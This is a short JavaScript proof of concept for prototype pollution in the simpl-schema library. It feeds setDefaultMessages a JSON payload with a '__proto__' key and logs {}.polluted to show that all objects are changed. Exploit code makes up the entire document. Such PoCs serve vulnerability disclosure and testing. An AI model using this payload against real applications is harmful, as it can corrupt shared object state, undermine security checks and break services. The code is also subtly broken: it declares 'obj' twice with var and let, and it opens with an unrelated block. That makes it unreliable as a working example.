var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const SimpleSchema = require('simpl-schema').default;
let obj = {};
console.log({}.polluted);
SimpleSchema.setDefaultMessages(JSON.parse('{"__proto__":{"polluted":"yes"}}'));
console.log({}.polluted);